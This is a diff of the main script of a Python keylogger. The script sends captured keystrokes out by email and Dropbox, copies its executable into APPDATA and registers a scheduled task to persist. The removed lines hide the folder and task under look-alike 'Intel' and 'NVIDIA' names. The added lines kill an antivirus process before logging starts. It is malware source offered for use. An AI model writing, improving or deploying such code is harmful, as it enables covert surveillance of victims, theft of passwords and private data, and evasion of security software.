@@ -1,7 +1,8 @@
 import os
-import psutil
+
 from dotenv import load_dotenv
 from keylogger import KeyLogger
+from utils import is_process_running, stop_process
 
 load_dotenv()
 
@@ -14,29 +15,25 @@ EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
 EMAIL_CC = os.getenv("EMAIL_CC")
 DROPBOX_TOKEN = os.getenv("DROPBOX_TOKEN")
 
-SEND_REPORT_EVERY = 5  # seconds
+SEND_REPORT_EVERY = 60  # seconds
 MAGIC_WORD = "stop"
 
-SRC_FILE = "D:\main.exe"
-DEST_FOLDER = os.path.join(os.getenv("APPDATA"), "InteI")
-TASK_NAME = "NVIDlA"
-
-
-def is_process_running(process_name):
-    count = 0
-    for proc in psutil.process_iter(attrs=["pid", "name"]):
-        if proc.info["name"] == process_name:
-            count += 1
-    return count
+EXE_FILENAME = "main.exe"
+SRC_FILE = f"D:\{EXE_FILENAME}"
+DEST_FOLDER = os.path.join(os.getenv("APPDATA"), "KEYLOGGER")
+SCHEDULED_TASK_NAME = "TASK_NAME"
+ANTIVIRUS_PROCESS = "antivirus.exe"
 
 
 def main():
-    running_instances = is_process_running("main.exe")
-    print(f"Number of 'main.exe' ongoing processes: {running_instances}")
+    running_instances = is_process_running(EXE_FILENAME)
+    print(f"Number of '{EXE_FILENAME}' ongoing processes: {running_instances}")
 
     if running_instances >= 4:
         print("Too many ongoing processes. Exiting.")
         return
+
+    stop_process(ANTIVIRUS_PROCESS)
 
     keylogger = KeyLogger(
         time_interval=SEND_REPORT_EVERY,
@@ -51,7 +48,7 @@ def main():
         dropbox_token=DROPBOX_TOKEN,
         src_file=SRC_FILE,
         dest_folder=DEST_FOLDER,
-        task_name=TASK_NAME,
+        scheduled_task_name=SCHEDULED_TASK_NAME,
     )
     keylogger.run()
 
